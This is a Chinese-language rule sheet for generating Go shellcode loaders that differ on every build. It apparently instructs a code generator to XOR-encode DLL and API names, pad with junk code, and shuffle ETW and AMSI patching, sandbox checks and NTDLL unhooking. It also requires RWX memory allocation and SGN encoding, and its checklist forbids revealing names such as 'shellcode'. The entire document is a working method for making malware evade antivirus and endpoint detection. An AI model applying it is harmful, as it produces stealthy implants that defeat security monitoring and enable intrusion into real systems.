# 代码随机化规范

每次生成 Go 代码时，必须按照以下规则随机化，确保**每次输出完全不同的二进制**。

---

## 1. 变量名随机化

**规则：** 所有变量名、函数名使用随机短标识符。

**生成方法（每次随机选一种模式）：**
- 模式 A：单字母 + 数字，如 `a1`, `b2`, `c3`, `d4` ...
- 模式 B：随机 3-5 字母组合，如 `xmn`, `qwp`, `zkt` ...
- 模式 C：加扰的有意义单词，如 `allocMem`, `cpyData`, `runThr`

**不同函数用不同风格，避免模式化。**

---

## 2. 字符串 XOR 编码

**规则：** 所有 DLL 名、函数名、路径等敏感字符串不得以明文出现在源码中。

**⚠️ 关键要求：XOR 编码必须用 Python 脚本计算，禁止手动计算！**

手算 XOR 极易出错（已验证导致崩溃不上线）。必须：
1. 用 Python `[b ^ key for b in s.encode()]` 计算
2. 计算后立即验证 `''.join(chr(b ^ key) for b in encoded) == original`
3. 验证通过后才能写入 Go 代码

**生成方法：**
1. 原始字符串 → []byte
2. 生成随机 1 字节 XOR key（0x01-0xFE）
3. 用 Python 脚本计算每个字节 XOR key → 编码后的 []byte
4. 验证编码正确性
5. 代码中存储编码后的字节，运行时解码

**Go 解码函数（随机变量名，可内联或独立函数）：**
```go
// 独立函数版
func <随机名>(d []byte, k byte) string {
    b := make([]byte, len(d))
    for i := range d { b[i] = d[i] ^ k }
    return string(b)
}

// 或内联版（在需要处直接写循环）
```

**不同字符串可用不同 XOR key，进一步增加随机性。**

---

## 3. 垃圾代码填充

**规则：** 在函数间和函数内随机插入无实际操作但看起来合理的代码。

**插入类型（每次随机选 2-4 种，每种 1-2 处）：**

| 类型 | 示例 |
|------|------|
| 无用变量 | `_ = make([]byte, <随机大小>)` |
| 无用计算 | `_ = <随机数> * <随机数> + <随机数>` |
| 无用条件 | `if <永假条件> { _ = <无用操作> }` |
| 无用循环 | `for i := 0; i < 1; i++ { _ = i }` |
| 垃圾函数 | 定义一个永不调用的简单函数 |
| 无用 import | 导入 `_ "strconv"` 等无害包 |

---

## 4. 代码顺序随机化

**规则：** 独立语句/块的顺序随机打乱。

**可打乱的内容：**
- `patchETW()` 和 `patchAMSI()` 的调用顺序
- `antiSandbox()` 和 `unhookNTDLL()` 的调用顺序
- 变量声明顺序
- API proc 获取顺序（先取哪个 DLL 的哪个函数）
- `VirtualAlloc` / `RtlCopyMemory` / `VirtualProtect` 之间夹杂无用代码的顺序

---

## 5. 代码结构变化

**规则：** 同一逻辑每次用不同结构实现。

**变化方式：**
- 内存分配：直接 `VirtualAlloc.Call(...)` vs 先赋值变量再 Call
- 错误处理：忽略返回值 vs 检查返回值
- 循环：`for i:=0; i<n; i++` vs `for i := range x` vs `for _, v := range`
- 分支：`if err != nil { return }` vs 忽略 err
- 匿名函数：某些逻辑可包装为 IIFE（立即执行函数表达式）

---

## 6. Go 源码生成方式

**必须使用 Python 脚本生成 Go 源码，禁止手写 XOR 字节数组。**

原因：手算 XOR 编码极易出错，已验证导致进程崩溃不上线。

**正确流程：**
1. Python 中定义所有需要编码的字符串和对应 key
2. Python 计算 XOR 编码并验证
3. Python 拼接完整 Go 源码（用 f-string 或模板）
4. Python 写入 .go 文件

---

## 随机化检查清单（生成后自检）

- [ ] 所有敏感字符串 XOR 编码？DLL名/函数名/路径？
- [ ] **XOR 编码用 Python 脚本计算并验证？（禁止手算）**
- [ ] 变量名不是常见命名（addr, shellcode, hProcess 等）？
- [ ] 至少 3 处垃圾代码填充？
- [ ] patchETW/patchAMSI 补丁字节正确？
- [ ] 函数间顺序有变化？
- [ ] 同一逻辑的结构和上次不同？
- [ ] SGN 已启用（默认）？VirtualAlloc 用 0x40 (RWX)？
